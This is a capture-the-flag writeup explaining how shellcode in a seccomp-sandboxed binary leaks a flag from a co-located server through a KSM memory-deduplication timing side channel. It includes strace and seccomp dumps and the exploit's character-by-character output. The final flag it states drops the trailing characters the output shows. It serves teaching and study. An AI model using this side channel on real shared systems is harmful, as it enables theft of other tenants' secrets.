# Covert Flag Capturing Operation Writeup

For this challenge we are given two binaries, one that we can interact with, and one flag server that is running on the same host as the first binary. The goal is to run code in the first binary that will somehow leak the flag out of the other service.


This writeup uses gdb-peda, follow these instructions to install it:
```
$ git clone https://github.com/longld/peda.git ~/peda
$ echo "source ~/peda/peda.py" >> ~/.gdbinit
```

### Part 1: pwnme
We start by gaining some information about the binary:
```
$ file pwnme
pwnme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, not stripped
$ gdb -q -ex "checksec" -ex "q" ./pwnme
Reading symbols from ./pwnme...(no debugging symbols found)...done.
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

Note that the binary is linked against [musl libc](https://www.musl-libc.org/)! We  use `strace` to get an overview of what the binary is doing:

```
$ strace ./pwnme
execve("./pwnme", ["./pwnme"], [/* 24 vars */]) = 0
arch_prctl(ARCH_SET_FS, 0x7fde4667c088) = 0
set_tid_address(0x7fde4667c0c0)         = 32418
mprotect(0x7fde4667a000, 4096, PROT_READ) = 0
mprotect(0x558464c53000, 4096, PROT_READ) = 0
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)  = 0
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len = 15, filter = 0x558464c54020}) = 0
mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fde46679000
read(0, foobar
"foobar\n", 4096)               = 7
--- SIGSEGV {si_signo=SIGSEGV, si_code=SI_KERNEL, si_addr=0} ---
+++ killed by SIGSEGV (core dumped) +++
[1]    32416 segmentation fault (core dumped)  strace ./pwnme
```

If we quickly run it through gdb and see where the program segfaults, we see that it tries to run our input as code. We can write this as pseudo-C like this:
```C
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filterprog);

buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
		   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

read(STDIN_FILENO, buf, 4096);

buf();
```

The most interesting feature of this binary is that it's using a eBPF filter to restrict certain system calls. To dump the filter, we can use [this](https://github.com/david942j/seccomp-tools) excellent tool:

```
$ seccomp-tools dump ./pwnme
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x0a 0x00 0x00000000  if (A == read) goto 0014
 0004: 0x15 0x09 0x00 0x00000001  if (A == write) goto 0014
 0005: 0x15 0x08 0x00 0x00000003  if (A == close) goto 0014
 0006: 0x15 0x07 0x00 0x00000009  if (A == mmap) goto 0014
 0007: 0x15 0x06 0x00 0x0000000b  if (A == munmap) goto 0014
 0008: 0x15 0x05 0x00 0x0000001c  if (A == madvise) goto 0014
 0009: 0x15 0x04 0x00 0x00000023  if (A == nanosleep) goto 0014
 0010: 0x15 0x03 0x00 0x00000029  if (A == socket) goto 0014
 0011: 0x15 0x02 0x00 0x0000002a  if (A == connect) goto 0014
 0012: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0014
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

The filter only allows us to execute code in 64-bit mode, and we can only use the following system calls:
* read
* write
* close
* mmap
* munmap
* madvise
* nanosleep
* socket
* connect
* exit

Anything else will result in the process being killed immediately.

### Part 2: server
As the task description says, there's no need to look too closely at the server code. There shouldn't be any bugs, but we still need to communicate with it to see what happens with the data we send it.

The server is started with an IP address and port as arguments, and reads the flag from the file `flag.txt` in the same folder.

`strace` can be used to get an overview of what the server does when it receives a new connection. Below is a test run where we send the string `testing` from a client:
```
$ strace -e trace=\!epoll_pwait -f -D ./server 127.0.0.1 1337
socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
) = 38
listen(3, 128)                          = 0
epoll_create1(0)                        = 4
epoll_ctl(4, EPOLL_CTL_ADD, 3, {EPOLLIN, {u32=3497424080, u64=140732395844816}}) = 0
) = 27
accept(3, {sa_family=AF_INET, sin_port=htons(45294), sin_addr=inet_addr("127.0.0.1")}, [16]) = 5
) = 23
epoll_ctl(4, EPOLL_CTL_ADD, 5, {EPOLLIN, {u32=3497424456, u64=140732395845192}}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb82be07000
madvise(0x7fb82be07000, 8192, MADV_MERGEABLE) = 0
read(5, "testing\n", 8192)              = 8
write(5, "OK!\n", 4)                    = 4
) = 9
strace: Process 31931 detached
```

There are two really interesting function calls here. First, the server calls `mmap()` with a size of 8192. Meaning that we can probably send two pages (as one page is 4096 bytes) worth of data. To confirm that this buffer is actually used to store our data, we can attach with gdb and dump the memory at `0x7fb82be07000`. Before attach with gdb, we need to kill strace, or else gdb won't be able to trace the server process. 31931 is the PID of the server process.

```
$ killall strace
$ gdb -q -p 31931 ./server -ex "x/s 0x7fb82be07000
testing\nTG18{testing_flag_123}
```

Interesting! The server will append the flag to our input. In addition, the memory area is marked as mergeable using the `madvise()` system call as can be shown by the output of strace. When pages are marked as mergeable, a Linux subsystem known as [KSM](https://www.kernel.org/doc/Documentation/vm/ksm.txt) can perform memory-deduplication of pages that contain the same contents. For example, if two pages containing the string "AAAA" are both marked as mergeable by using `madvise()` and KSM is enabled, the kernel merges the two pages into one physical page. The pages is then marked as read-only and writes to this page results in a copy-on-write. This can be used as a side-channel attack to detect pages with the same contents. To do this, one has to create a page with contents one thinks resides in another page, wait for some time, and then write to this page. If it takes a lot longer than writing to a normal page, one can assume that this page was deduplicated because a page with the same contents exists on the system.

We know that the two services run on the same host, and that we can execute shellcode with some restrictions. We do have `mmap()` and `madvise()`, so it is possible for us to craft pages we can use to test for equality. Since the server concatenates the flag and our input, we can create a page containing a single `}`. We know that the flag ends with this character, so we can start by determining the length of the flag by sending a lot of padding, increasing the amount by one until the server has a page that only contains the `}`.

After we find the length, we can start guessing characters backwards. We could do this the other way around as well, creating a page containing a lot of padding followed by the start of the flag, then generating a new page for every possible ASCII character and measuring the time it takes to access each of them. We did the same except backwards when implementing our solution. To recap the steps we need to take to leak the flag:

1. Find the length of the flag by sending more and more padding until the end of the flag spills over into the next page.
2. Brute-force characters by creating sets containing all possible combinations and then measure the time it takes to access each of them. The slowest is the correct character.

The shellcode can be found [here](shellcode.s).

```
[+] Opening connection to covert.tghack.no on port 6060: Done
shellcode size: 1472
[*] Switching to interactive mode
?
?}
t
t?}
h
ht?}
g
ght?}
1
1ght?}
r
r1ght?}
_
_r1ght?}
3
3_r1ght?}
f
f3_r1ght?}
4
4f3_r1ght?}
s
s4f3_r1ght?}
_
_s4f3_r1ght?}
y
y_s4f3_r1ght?}
l
ly_s4f3_r1ght?}
l
lly_s4f3_r1ght?}
4
4lly_s4f3_r1ght?}
3
34lly_s4f3_r1ght?}
r
r34lly_s4f3_r1ght?}
_
_r34lly_s4f3_r1ght?}
5
5_r34lly_s4f3_r1ght?}
1
15_r34lly_s4f3_r1ght?}
_
_15_r34lly_s4f3_r1ght?}
n
n_15_r34lly_s4f3_r1ght?}
0
0n_15_r34lly_s4f3_r1ght?}
1
10n_15_r34lly_s4f3_r1ght?}
7
710n_15_r34lly_s4f3_r1ght?}
4
4710n_15_r34lly_s4f3_r1ght?}
c
c4710n_15_r34lly_s4f3_r1ght?}
1
1c4710n_15_r34lly_s4f3_r1ght?}
l
l1c4710n_15_r34lly_s4f3_r1ght?}
p
pl1c4710n_15_r34lly_s4f3_r1ght?}
u
upl1c4710n_15_r34lly_s4f3_r1ght?}
d
dupl1c4710n_15_r34lly_s4f3_r1ght?}
3
3dupl1c4710n_15_r34lly_s4f3_r1ght?}
d
d3dupl1c4710n_15_r34lly_s4f3_r1ght?}
_
_d3dupl1c4710n_15_r34lly_s4f3_r1ght?}
y
y_d3dupl1c4710n_15_r34lly_s4f3_r1ght?}
r
ry_d3dupl1c4710n_15_r34lly_s4f3_r1ght?}
0
0ry_d3dupl1c4710n_15_r34lly_s4f3_r1ght?}
m
m0ry_d3dupl1c4710n_15_r34lly_s4f3_r1ght?}
3
3m0ry_d3dupl1c4710n_15_r34lly_s4f3_r1ght?}
m
m3m0ry_d3dupl1c4710n_15_r34lly_s4f3_r1ght?}
```
We didn't need to find the first five characters, as we known they are `TG18{`. Prepend these characters and we got the flag: `TG18{m3m0ry_d3dupl1c4710n_15_r34lly_s4f3_r1ght`.
